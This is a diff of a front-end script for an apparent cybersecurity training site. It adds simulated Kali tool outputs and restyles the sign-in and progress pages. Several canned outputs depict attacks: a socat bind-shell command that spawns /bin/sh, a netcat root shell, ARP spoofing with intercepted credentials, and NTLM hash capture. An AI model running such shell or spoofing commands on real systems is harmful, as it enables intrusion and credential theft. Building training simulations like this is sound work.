+  }
+
+  if (tool === 'cewl') {
+    return `CeWL 5.4.8 (Custom Word List generator)
+Crawling: http://${targetIp}:8080/
+[+] Extracted 148 unique domain-specific passwords.`;
+  }
+
+  if (tool === 'hashid' || tool === 'hash-identifier') {
+    return `Analyzing hash:
+[+] MD5 [Hashcat Mode: 0]
+[+] NTLM [Hashcat Mode: 1000]
+[+] MD4 [Hashcat Mode: 900]`;
+  }
+
+  // 5. WIRELESS
+  if (tool === 'aircrack-ng') {
+    return `Aircrack-ng 1.7 
+[00:00:01] Tested 45,210 keys (got 14,201 IVs)
+KEY FOUND! [ 1F:90:3A:4B:5C ] (ASCII: cyberlab2026)
+Decrypted correctly: 100%`;
+  }
+
+  if (tool === 'airmon-ng') {
+    return `PHY	Interface	Driver		Chipset
+phy0	wlan0		mac80211_hwsim	Software 802.11 Radiotap Sim
+		(monitor mode enabled on wlan0mon)`;
+  }
+
+  if (tool === 'airodump-ng') {
+    return `CH  6 ][ Elapsed: 12 s ][ 2026-09-17 12:00 
+ BSSID              PWR  Beacons    #Data   CH  ENC  AUTH ESSID
+ 02:00:00:00:01:00  -42       24       128   6  WPA2 PSK  CyberLab-Secure-AP`;
+  }
+
+  if (tool === 'wifite') {
+    return `wifite v2.6.0 automated wireless auditor
+[+] Scanning on wlan0mon. Found target AP: CyberLab-Secure-AP
+[+] Captured WPA 4-way Handshake!
+[+] Cracking handshake with rockyou.txt: Key = 'cyberlab2026'`;
+  }
+
+  // 6. SNIFFING & SPOOFING
+  if (tool === 'tcpdump') {
+    return `tcpdump: verbose output suppressed, listening on eth0, capture size 262144 bytes
+12:00:01.104 IP ${myIp}.45120 > ${targetIp}.8080: Flags [S], seq 1849201
+12:00:01.105 IP ${targetIp}.8080 > ${myIp}.45120: Flags [S.], seq 4819203
+12:00:01.106 IP ${myIp}.45120 > ${targetIp}.8080: Flags [P.], HTTP: GET / HTTP/1.1
+12:00:01.108 IP ${targetIp}.8080 > ${myIp}.45120: Flags [P.], HTTP: HTTP/1.1 200 OK
+4 packets captured, 4 packets received by filter`;
+  }
+
+  if (tool === 'wireshark' || tool === 'tshark') {
+    return `Capturing on 'eth0'
+    1 0.000000    ${myIp} → ${targetIp}    TCP 74 45120 → 8080 [SYN]
+    2 0.000102    ${targetIp} → ${myIp}    TCP 74 8080 → 45120 [SYN, ACK]
+    3 0.000210    ${myIp} → ${targetIp}    HTTP 208 GET /login HTTP/1.1 
+    4 0.000450    ${targetIp} → ${myIp}    HTTP 494 HTTP/1.1 200 OK
+4 packets captured`;
+  }
+
+  if (tool === 'bettercap' || tool === 'ettercap') {
+    return `bettercap v2.32.0 [type 'help' for a list of commands]
+[12:00:00] [inf] net.recon discovering hosts on subnet 10.10.0.0/24...
+[12:00:01] [inf] arp.spoof started (poisoning ${targetIp} <-> 10.10.0.1)
+[12:00:02] [inf] Intercepted credential: admin / password123`;
+  }
+
+  if (tool === 'responder') {
+    return `Responder v3.1 - LLMNR, NBT-NS and MDNS Poisoner
+[+] Listening on eth0 (${myIp})
+[+] [LLMNR] Poisoned answer sent to ${targetIp} for name TARGET
+[+] [NTLMv2] Captured Hash: admin::TARGET:1122334455667788:A98F7C6B...`;
+  }
+
+  // 7. SHELLS & NETWORKING
+  if (tool === 'nc' || tool === 'netcat' || tool === 'ncat') {
+    if (normalized.includes('-l')) {
+      return `Listening on [0.0.0.0] (port 4444)
+Connection from ${targetIp}:48912 accepted
+root@target:~# whoami
+root
+root@target:~# cat /root/flag.txt
+${flag}`;
+    }
+    return `Ncat: Version 7.94SVN Connected to ${parts[1] || targetIp}:${parts[2] || '8080'}.
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.12.2`;
+  }
+
+  if (tool === 'socat') {
+    return `[+] socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh
+Relaying input/output streams between endpoints.`;
+  }
+
+  if (tool === 'chisel') {
+    return `2026/09/17 12:00:00 client: Connected to http://${targetIp}:8080
+[+] Reverse SOCKS5 tunnel active on 127.0.0.1:1080`;
+  }
+
+  // 8. REVERSE & FORENSICS
+  if (tool === 'binwalk') {
+    return `DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             ELF, 64-bit LSB executable, AMD x86-64
+370           0x172           gzip compressed data
+1204          0x4B4           POSIX tar archive (GNU)`;
+  }
+
+  if (tool === 'exiftool') {
+    return `ExifTool Version Number : 12.76
+File Name               : target_capture.jpg
+Camera Model Name       : Cyber Lab LabCam 4K
+Comment                 : Stored Flag: ${flag}`;
+  }
+
+  if (tool === 'steghide') {
+    return `steghide -- extract -sf flag.jpg
+wrote extracted data to "flag.txt".
+Contents: ${flag}`;
+  }
+
+  if (tool === 'radare2' || tool === 'r2') {
+    return ` -- Run r2 with -AA to analyze all referenced code!
+[0x00001040]> aaa
+[0x00001040]> pdf @ main
+|   sym.main ();
+|           0x00001150      lea rdi, str.FLAG_IS_${flag}
+|           0x00001157      call sym.imp.puts
+\\           0x00001162      ret`;
+  }
+
+  if (tool === 'ghidra') {
+    return `[*] Launching Ghidra Headless Analyzer v11.0.3
+[*] Decompiled entry point:
+undefined8 main(void) {
+    puts("Cyber Lab Offensive Training Binary");
+    check_flag("${flag}");
+    return 0;
+}`;
+  }
+
+  if (tool === 'checksec') {
+    return `[*] '/root/exploits/shell.elf'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments (Exploitable)`;
+  }
+
+  if (tool === 'strings') {
+    return `/lib64/ld-linux-x86-64.so.2
+libc.so.6
+puts
+Cyber Lab Target Workstation
+${flag}`;
+  }
+
+  if (tool === 'volatility' || tool === 'vol') {
+    return `Volatility 3 Framework 2.5.0
+PID	PPID	ImageFileName	CreateTime
+1	0	systemd		2026-09-17 12:00:00
+4242	1	cyber-backdoor	2026-09-17 12:01:10
+[+] Discovered active persistence backdoor process (PID 4242)`;
+  }
+
+  // 9. SYSTEM UTILITIES
+  if (tool === 'which' || tool === 'whereis') {
+    const queried = parts.slice(1).filter(Boolean);
+    if (tool === 'which') {
+      const items = queried.length ? queried : ['nmap'];
+      return items.map(t => `/usr/bin/${t}`).join('\n');
+    } else {
+      const items = queried.length ? queried : ['nmap'];
+      return items.map(t => `${t}: /usr/bin/${t} /usr/share/man/man1/${t}.1.gz`).join('\n');
+    }
+  }
+
+  if (tool === 'man') {
+    const p = parts[1] || 'nmap';
+    return `${p.toUpperCase()}(1) - Kali Linux security & pentesting tool\nRun '${p} --help' for complete command flags.`;
+  }
+
+  if (tool === 'top' || tool === 'htop') {
+    return `top - 12:00:00 up 4 days,  1 user,  load average: 0.08, 0.12, 0.09
+Tasks: 128 total,   1 running, 127 sleeping
+    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM  COMMAND
+      1 root      20   0  168400  12480   8920 S   0.0   0.3  systemd
+    101 root      20   0   14210   4100   3200 S   0.0   0.1  bash
+    445 root      20   0   84200  18400  12100 S   0.0   0.4  postgres
+    808 root      20   0   48120   9200   7400 S   0.0   0.2  nginx
+   4242 root      20   0   28900   6100   4800 S   0.0   0.1  cyber-backdoor`;
+  }
+
+  if (tool === 'netstat' || tool === 'ss') {
+    return `Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      101/sshd            
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      808/nginx           
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      912/python3         
+tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      445/postgres        
+tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      1204/nc`;
+  }
+
+  if (tool === 'arp') {
+    return `Address                  HWtype  HWaddress           Flags Mask            Iface
+10.10.0.1                ether   02:42:0a:0a:00:01   C                     eth0
+10.10.0.10               ether   02:42:0a:0a:00:0a   C                     eth0
+10.10.0.50               ether   02:42:0a:0a:00:32   C                     eth0`;
+  }
+
+  if (tool === 'route') {
+    return `Kernel IP routing table
+Destination     Gateway         Genmask         Flags Iface
+default         10.10.0.1       0.0.0.0         UG    eth0
+10.10.0.0       0.0.0.0         255.255.255.0   U     eth0`;
+  }
+
+  if (tool === 'free') {
+    return `               total        used        free      shared  buff/cache   available
+Mem:         4194304      698880     2913280       14200      582144     3259904
+Swap:        2097152           0     2097152`;
+  }
+
+  if (tool === 'df') {
+    return `Filesystem     1K-blocks     Used Available Use% Mounted on
+overlay         61254320 14829100  43284220  26% /
+tmpfs              65536        0     65536   0% /dev`;
+  }
+
+  if (tool === 'hostname') return 'kali-cyberlab';
+  if (tool === 'uptime') return ' 12:00:00 up 4 days, 2:14, 1 user, load average: 0.08, 0.12, 0.09';
+  if (tool === 'date') return new Date().toUTCString();
+
+  // 10. KALI OFFENSIVE SUITE INDEX
+  if (tool === 'kali-tools' || tool === 'tools') {
+    return `================================================================================
+                    KALI LINUX 2024 · OFFENSIVE SECURITY SUITE                   
+================================================================================
+[01] Recon & OSINT:       nmap, masscan, fping, netdiscover, amass, sublist3r,
+                          enum4linux, theharvester, whatweb, wafw00f, whois, dig
+[02] Web Vulnerability:   sqlmap, nikto, gobuster, dirb, ffuf, wfuzz, wpscan,
+                          burpsuite, commix, zap, cadaver, curl, wget
+[03] Exploitation:        msfconsole, msfvenom, searchsploit, crackmapexec,
+                          evil-winrm, impacket-psexec, secretsdump, chisel
+[04] Password Attacks:    john, hashcat, hydra, medusa, crunch, cewl, hashid
+[05] Wireless Attacks:    aircrack-ng, airmon-ng, airodump-ng, wifite, kismet
+[06] Sniffing & Spoofing: wireshark, tshark, tcpdump, bettercap, responder,
+                          arpspoof, macchanger, ettercap, mitmproxy
+[07] Reverse Engineering: ghidra, radare2, r2, gdb, objdump, readelf, strings,
+                          checksec, ltrace, strace
+[08] Forensics & Carving: volatility, binwalk, exiftool, steghide, autopsy
+[09] Network Pivoting:    nc, netcat, socat, ssh, scp, iptables, ufw
+================================================================================
+Type any tool name followed by '-h' or target (10.10.0.10) to run.`;
+  }
+
+  return null;
+}
+
 async function runCommand(raw) {
   if (!session) return;
   const rawInput = raw.trim();
@@ -3173,11 +4056,20 @@ async function runCommand(raw) {
     } catch (e) {}
   }
 
+  if (isLiveApi || session.lab.id === 'kali-sandbox') {
+    session.output.push('[Error] The live Kali command could not run. Check the backend and reconnect.');
+    updateTermDisplay();
+    return;
+  }
+
   // Local command runner
   let cmd = rawInput.replace(/^(sudo\s+|bash\s+|sh\s+|\.\/|\/bin\/|\/usr\/bin\/)+/i, '').trim();
   let result = '';
 
-  if (cmd === 'clear') {
+  const kaliToolRes = simulateKaliTool(cmd, session);
+  if (kaliToolRes) {
+    result = kaliToolRes;
+  } else if (cmd === 'clear') {
     session.output = [];
   } else if (cmd === 'help') {
     result = `Supported commands:\n  help, clear, whoami, id, uname -a, pwd, ls, ls -la, nmap, kali-tools\n  ${l.commands.join('\n  ')}\n\nEnvironment: Ephemeral sandbox.`;
@@ -3230,7 +4122,7 @@ async function runCommand(raw) {
   } else if (cmd.startsWith('ping')) {
     const host = cmd.split(' ').slice(1).find(x => !x.startsWith('-')) || '10.10.0.10';
     result = `PING ${host} (${host}) 56(84) bytes of data.\n64 bytes from ${host}: icmp_seq=1 ttl=64 time=0.312 ms\n64 bytes from ${host}: icmp_seq=2 ttl=64 time=0.284 ms\n--- ${host} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1002ms`;
-  } else if (cmd === 'kali-tools' || cmd.startsWith('which nmap') || cmd === 'tools') {
+  } else if (cmd === 'kali-tools' || cmd === 'tools') {
     result = '=== Kali Linux Pre-Installed Tools Suite ===\n[+] Reconnaissance:    nmap, masscan, fping, netdiscover, amass, enum4linux\n[+] Web Applications:  burpsuite, zaproxy, gobuster, dirb, ffuf, wpscan, sqlmap\n[+] Exploitation:      msfconsole, msfvenom, searchsploit, exploitdb, commix\n[+] Password Attacks:  john, hashcat, hydra, medusa, crunch, rockyou.txt\n[+] Network & Wireless: wireshark, tcpdump, tshark, aircrack-ng, bettercap\n[+] Post-Exploitation: mimikatz, powersploit, evil-winrm, responder, netcat';
   } else if (cmd === 'nmap' || cmd === 'nmap -h' || cmd === 'nmap --help') {
     result = 'Nmap 7.94SVN ( https://nmap.org )\nUsage: nmap [Scan Type(s)] [Options] {target specification}\nTARGET SPECIFICATION:\n  Ex: 10.10.0.10, 10.10.0.0/24, target.lab\nSCAN TECHNIQUES:\n  -sS/sT: TCP SYN/Connect() scan\n  -sV: Probe open ports to determine service/version info\n  -p <port ranges>: Only scan specified ports\nEXAMPLES:\n  nmap -sV -p 22,80,8080 10.10.0.10';
@@ -3271,7 +4163,7 @@ async function runCommand(raw) {
     result = responses[cmd] || 'Command completed.';
   } else {
     result = isKali
-      ? `bash: ${cmd.split(' ')[0]}: command not found`
+      ? `bash: ${cmd.split(' ')[0]}: command not found\nType 'kali-tools' to explore 90+ pre-installed security tools.`
       : 'Command unavailable in this demo. Type help to see supported commands.';
   }
 
@@ -3680,10 +4572,10 @@ function progress() {
     <div class="progress-hub">
       <div class="pagehead" style="margin-bottom:0;">
         <div>
-          <div class="eyebrow" style="letter-spacing:0.12em;">TRAINING ANALYTICS & SKILLS ASSESSMENT</div>
-          <h1 style="font-size:30px; margin:4px 0 8px;">Cybersecurity Competency Dashboard</h1>
+          <div class="eyebrow">EVERY SESSION COUNTS</div>
+          <h1>Your skills, taking shape.</h1>
           <p style="color:var(--text-secondary); max-width:680px; margin:0;">
-            Validated operational skills, completed lab missions, captured cryptographic flags, and live security clearance tier for <strong>${escape(currentUser.name)}</strong>.
+            See what you've learned, celebrate your milestones, and find your next challenge.
           </p>
         </div>
         <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
@@ -3757,16 +4649,16 @@ function progress() {
 
       <div class="progress-tabs-nav">
         <button class="progress-tab-btn ${progressSubTab === 'domains' ? 'active' : ''}" data-ptab="domains">
-          <span>🏆</span> Domain Competency
+          Skills by domain
         </button>
         <button class="progress-tab-btn ${progressSubTab === 'flags' ? 'active' : ''}" data-ptab="flags">
-          <span>🚩</span> Flag Vault & Completed Labs (${history.length})
+          Captured flags (${history.length})
         </button>
         <button class="progress-tab-btn ${progressSubTab === 'badges' ? 'active' : ''}" data-ptab="badges">
-          <span>🎖️</span> Achievements & Badges (${badges.filter(b => b.unlocked).length}/${badges.length})
+          Achievements (${badges.filter(b => b.unlocked).length}/${badges.length})
         </button>
         <button class="progress-tab-btn ${progressSubTab === 'curriculum' ? 'active' : ''}" data-ptab="curriculum">
-          <span>📋</span> Full Curriculum Matrix (${labs.length})
+          All challenges (${labs.length})
         </button>
       </div>
 
@@ -3933,6 +4825,14 @@ function updateUserUI() {
 function authView() {
   $('#main').innerHTML = `
     <div class="auth-view">
+      <section class="auth-story">
+        <a class="auth-home-link" href="/">← Back to Cyber Lab</a>
+        <div class="eyebrow">THE BEST WAY TO LEARN IS TO DO.</div>
+        <h2>Build skills. <br>Break boundaries. <br><span>Stay curious.</span></h2>
+        <p>A space to explore cybersecurity, sharpen your instincts, and learn something new with every session.</p>
+        <div class="auth-scene" aria-hidden="true"><div class="auth-scene-ring"></div><div class="auth-scene-ring ring-two"></div><div class="auth-scene-cube"><span>&gt;_</span><small>YOUR NEXT CHALLENGE</small></div><div class="auth-scene-caption"><i></i> Learn. Practice. Repeat.</div></div>
+        <div class="auth-story-foot"><span>01 / EXPLORE</span><span>02 / PRACTICE</span><span>03 / GROW</span></div>
+      </section>
       <div class="auth-card" id="auth-card">
         <div class="auth-header">
           <div class="auth-brandmark">
@@ -3940,24 +4840,14 @@ function authView() {
               <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
             </svg>
           </div>
-          <h1 class="auth-title">Cyber Lab<span class="branddot">.</span></h1>
-          <div class="auth-tagline">
-            <span>Train</span>
-            <span class="tagline-dot">·</span>
-            <span>Attack</span>
-            <span class="tagline-dot">·</span>
-            <span>Defend</span>
-          </div>
-          <br>
-          <div class="auth-clearance-badge">
-            <span class="clearance-dot"></span>
-            <span>SECURITY CLEARANCE // LEVEL 3 GATEWAY</span>
-          </div>
+          <div class="eyebrow">YOUR WORKSPACE AWAITS</div>
+          <h1 class="auth-title">${authTab === 'signin' ? 'Welcome back.' : 'Start something great.'}</h1>
+          <p class="auth-intro">${authTab === 'signin' ? 'Sign in to continue your learning journey.' : 'Set up your profile and find your first challenge.'}</p>
         </div>
 
         <div class="auth-tabs" role="tablist">
-          <button class="auth-tab ${authTab === 'signin' ? 'active' : ''}" id="tab-signin" role="tab">Operator Sign In</button>
-          <button class="auth-tab ${authTab === 'register' ? 'active' : ''}" id="tab-register" role="tab">New Registration</button>
+          <button class="auth-tab ${authTab === 'signin' ? 'active' : ''}" id="tab-signin" role="tab" aria-selected="${authTab === 'signin'}">Sign in</button>
+          <button class="auth-tab ${authTab === 'register' ? 'active' : ''}" id="tab-register" role="tab" aria-selected="${authTab === 'register'}">Create profile</button>
         </div>
 
         <div id="auth-error" class="auth-error" role="alert"></div>
@@ -3965,24 +4855,24 @@ function authView() {
         <form class="auth-form" id="auth-form">
           ${authTab === 'register' ? `
             <div class="auth-field">
-              <label for="auth-fullname"><span>▱</span> Full Name & Callsign</label>
+              <label for="auth-fullname">Full name</label>
               <input id="auth-fullname" placeholder="e.g. Alex Vance" required autocomplete="name">
             </div>
           ` : ''}
 
           <div class="auth-field">
-            <label for="auth-email"><span>⌑</span> Callsign / Email</label>
+            <label for="auth-email">Email address</label>
             <input id="auth-email" type="email" placeholder="operator@cyberlab.io" value="${authTab === 'signin' ? (currentUser.email || 'kartik@cyberlab.io') : ''}" required autocomplete="username">
           </div>
 
           <div class="auth-field">
-            <label for="auth-password"><span>🔒</span> Access Key / Passphrase</label>
+            <label for="auth-password">Password</label>
             <input id="auth-password" type="password" placeholder="••••••••••••" value="${authTab === 'signin' ? 'cyberlab2026' : ''}" required autocomplete="current-password">
           </div>
 
           ${authTab === 'register' ? `
             <div class="auth-field">
-              <label for="auth-role"><span>⚡</span> Role Specialization</label>
+              <label for="auth-role">Your focus</label>
               <select id="auth-role">
                 <option value="Security Analyst">Security Analyst (Blue Team)</option>
                 <option value="Penetration Tester">Penetration Tester (Red Team)</option>
@@ -3995,18 +4885,18 @@ function authView() {
           <div class="auth-options">
             <label class="auth-checkbox">
               <input type="checkbox" id="auth-remember" checked>
-              <span>Remember workstation</span>
+              <span>Remember me</span>
             </label>
-            <a class="auth-link" id="auth-hint-btn">Forgot key?</a>
+            <button type="button" class="auth-link" id="auth-hint-btn">Demo password?</button>
           </div>
 
           <button type="submit" class="primary auth-submit-btn" id="auth-submit">
-            ${authTab === 'signin' ? 'Authorize Terminal <span>↗</span>' : 'Register Operator Clearance <span>↗</span>'}
+            ${authTab === 'signin' ? 'Enter workspace <span>→</span>' : 'Create profile <span>→</span>'}
           </button>
         </form>
 
         <div class="auth-demo-section">
-          <div class="auth-demo-label">⚡ QUICK TEST CLEARANCE (1-CLICK DEMO)</div>
+          <div class="auth-demo-label">OR EXPLORE A DEMO PROFILE</div>
           <div class="auth-demo-chips">
             <button class="auth-chip" data-demo="kartik" type="button">
               <span class="auth-chip-dot blue"></span>
@@ -4027,8 +4917,9 @@ function authView() {
           ${currentUser.isLoggedIn ? `
             <a id="return-dashboard" style="display:block;margin-bottom:12px;color:var(--cyan);font-weight:600;font-size:13.5px;cursor:pointer;">← Return to Main Website (${escape(currentUser.name)})</a>
           ` : ''}
-          <a id="bypass-guest">Continue as Guest Explorer →</a>
+          <button type="button" id="bypass-guest">Continue as guest <span>→</span></button>
         </div>
+        <p class="auth-local-notice">Demo profiles are saved in this browser.</p>
       </div>
     </div>
   `;
@@ -4335,7 +5226,7 @@ function initSettings() {
 }
 
 function init3DTilt() {
-  if (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+  if (window.matchMedia && (window.matchMedia('(prefers-reduced-motion: reduce)').matches || !window.matchMedia('(hover: hover) and (pointer: fine)').matches)) return;
 
   const tiltElements = document.querySelectorAll('.card, .feature, .metric');
   tiltElements.forEach(el => {
@@ -4351,9 +5242,10 @@ function init3DTilt() {
     }
 
     const isFeature = el.classList.contains('feature');
-    const maxTilt = isFeature ? 4 : 8;
+    const maxTilt = isFeature ? 1.5 : 3;
 
     const handleMove = e => {
+      if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
       const rect = el.getBoundingClientRect();
       const x = e.clientX - rect.left;
       const y = e.clientY - rect.top;
@@ -4363,12 +5255,12 @@ function init3DTilt() {
       const tiltX = -((y - centerY) / centerY) * maxTilt;
       const tiltY = ((x - centerX) / centerX) * maxTilt;
 
-      el.style.transform = `perspective(1100px) rotateX(${tiltX.toFixed(2)}deg) rotateY(${tiltY.toFixed(2)}deg) translateZ(${isFeature ? '4px' : '10px'})`;
+      el.style.transform = `perspective(1400px) rotateX(${tiltX.toFixed(2)}deg) rotateY(${tiltY.toFixed(2)}deg) translateY(${isFeature ? '-1px' : '-3px'})`;
 
       if (glare) {
         const glareX = (x / rect.width) * 100;
         const glareY = (y / rect.height) * 100;
-        glare.style.background = `radial-gradient(circle at ${glareX.toFixed(1)}% ${glareY.toFixed(1)}%, rgba(255, 255, 255, 0.18) 0%, rgba(255, 255, 255, 0) 65%)`;
+        glare.style.background = `radial-gradient(circle at ${glareX.toFixed(1)}% ${glareY.toFixed(1)}%, rgba(130, 175, 255, 0.09) 0%, rgba(255, 255, 255, 0) 65%)`;
         glare.style.opacity = '1';
       }
     };
